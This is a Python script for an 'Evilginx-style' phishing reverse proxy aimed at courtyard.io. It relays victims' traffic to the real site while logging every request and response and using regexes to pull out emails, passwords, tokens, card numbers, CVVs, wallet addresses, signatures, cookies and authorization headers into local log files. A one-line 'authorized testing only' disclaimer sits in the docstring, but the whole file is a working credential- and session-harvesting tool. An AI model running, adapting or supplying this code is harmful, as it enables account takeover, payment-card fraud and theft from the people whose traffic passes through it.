#!/usr/bin/env python3
"""
Evilginx-Style Reverse Proxy Framework
Sits between victim and real site, captures everything.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""
import re
import json
import base64
import hashlib
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, urljoin
import requests
import threading

# ─── CONFIG ────────────────────────────────────────────────────────────────

LOG_DIR = r"C:\Users\mobil\evilginx_logs"
import os
os.makedirs(LOG_DIR, exist_ok=True)

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EvilginxProxy:
    """Reverse proxy that captures credentials and sessions."""

    # Domains to proxy (phish domain -> real domain)
    HOSTS = {
        "courtyard.io": {
            "real": "courtyard.io",
            "redirects": {
                "api.courtyard.io": "api.courtyard.io",
            }
        },
    }

    # Patterns to capture from POST bodies
    CREDS_PATTERNS = {
        "email": r'email["\s:=]+([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
        "password": r'password["\s:=]+([^"&\s]{6,})',
        "token": r'token["\s:=]+([a-zA-Z0-9._-]{20,})',
        "card": r'(?:card|cc|number)["\s:=]+(\d{13,19})',
        "cvv": r'(?:cvv|cvc)["\s:=]+(\d{3,4})',
        "wallet": r'0x[a-fA-F0-9]{40}',
        "signature": r'(?:signature|sig)["\s:=]+([a-fA-F0-9]{64,})',
    }

    # Headers to log
    AUTH_HEADERS = [
        "authorization", "x-api-key", "x-auth-token", "cookie",
        "set-cookie", "x-csrf-token", "x-xsrf-token",
        "x-requested-with", "origin", "referer"
    ]

    def __init__(self):
        self.sessions = {}
        self.credentials = []
        self.request_count = 0

    def log(self, msg):
        """Print with timestamp."""
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] {msg}")

    def save_credentials(self, site, data):
        """Save captured credentials."""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "site": site,
            "data": data,
        }
        self.credentials.append(entry)
        path = os.path.join(LOG_DIR, "credentials.jsonl")
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.log(f"[CRED] Captured {list(data.keys())} from {site}")

    def save_session(self, session_id, data):
        """Save session data."""
        path = os.path.join(LOG_DIR, "sessions.jsonl")
        with open(path, "a") as f:
            f.write(json.dumps({
                "timestamp": datetime.now().isoformat(),
                "session_id": session_id,
                "data": data,
            }) + "\n")

    def log_request(self, method, url, headers, body, source="unknown"):
        """Log all request details."""
        self.request_count += 1
        entry = {
            "timestamp": datetime.now().isoformat(),
            "id": self.request_count,
            "method": method,
            "url": url,
            "headers": {k: v for k, v in headers.items()},
            "source": source,
        }
        if body:
            try:
                entry["body"] = body[:10000] if isinstance(body, str) else base64.b64encode(body[:5000]).decode()
            except:
                entry["body"] = "[error]"

        path = os.path.join(LOG_DIR, "requests.jsonl")
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")

        # Extract credentials
        if body and isinstance(body, str):
            for pname, pattern in self.CREDS_PATTERNS.items():
                matches = re.findall(pattern, body, re.IGNORECASE)
                if matches:
                    self.save_credentials(url, {pname: matches})

        # Log auth headers
        found_auth = {}
        for h in self.AUTH_HEADERS:
            val = headers.get(h) or headers.get(h.lower())
            if val:
                found_auth[h] = val
        if found_auth:
            self.save_credentials(url + "_headers", found_auth)

    def log_response(self, url, status, headers, body):
        """Log response details."""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "url": url,
            "status": status,
            "headers": {k: v for k, v in headers.items()},
        }
        if body:
            try:
                entry["body"] = body[:10000] if isinstance(body, str) else base64.b64encode(body[:5000]).decode()
            except:
                entry["body"] = "[error]"

        path = os.path.join(LOG_DIR, "responses.jsonl")
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")


class ProxyHandler(BaseHTTPRequestHandler):
    """HTTP request handler for reverse proxy."""

    proxy = EvilginxProxy()

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self):
        self._proxy_request("GET")

    def do_POST(self):
        self._proxy_request("POST")

    def do_PUT(self):
        self._proxy_request("PUT")

    def do_DELETE(self):
        self._proxy_request("DELETE")

    def do_PATCH(self):
        self._proxy_request("PATCH")

    def do_OPTIONS(self):
        self._proxy_request("OPTIONS")

    def _proxy_request(self, method):
        """Handle and proxy the request."""
        url = self.path
        if not url.startswith("http"):
            url = f"http://{self.headers.get('Host', 'localhost')}{url}"

        # Read body
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        # Log the request
        self.proxy.log_request(
            method=method,
            url=url,
            headers=dict(self.headers),
            body=body.decode("utf-8", errors="ignore") if body else None,
            source=self.client_address[0],
        )

        # Forward to real server
        try:
            headers = {k: v for k, v in self.headers.items()}
            headers.pop("Host", None)

            resp = requests.request(
                method=method,
                url=url,
                headers=headers,
                data=body,
                allow_redirects=False,
                verify=False,
                timeout=30,
            )

            # Log response
            self.proxy.log_response(
                url=url,
                status=resp.status_code,
                headers=dict(resp.headers),
                body=resp.text[:10000],
            )

            # Send response back
            self.send_response(resp.status_code)
            for key, value in resp.headers.items():
                if key.lower() not in ("transfer-encoding", "connection"):
                    self.send_header(key, value)
            self.end_headers()
            self.wfile.write(resp.content)

            self.proxy.log(f"[{method}] {url} -> {resp.status_code}")

        except Exception as e:
            self.proxy.log(f"[ERROR] {url}: {e}")
            self.send_response(502)
            self.end_headers()
            self.wfile.write(f"Proxy Error: {e}".encode())


def main():
    """Start the Evilginx-style proxy."""
    host = "127.0.0.1"
    port = 8080
    server = HTTPServer((host, port), ProxyHandler)
    print(f"""
╔══════════════════════════════════════════════════════════╗
║          EVILGINX-STYLE REVERSE PROXY                    ║
╠══════════════════════════════════════════════════════════╣
║  Proxy:   http://{host}:{port}                         ║
║  Logs:    C:\\Users\\mobil\\evilginx_logs\\               ║
║                                                          ║
║  Usage: Set browser proxy to {host}:{port}              ║
║  All traffic will be captured with credentials.          ║
╚══════════════════════════════════════════════════════════╝
""")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Proxy stopped.")


if __name__ == "__main__":
    main()
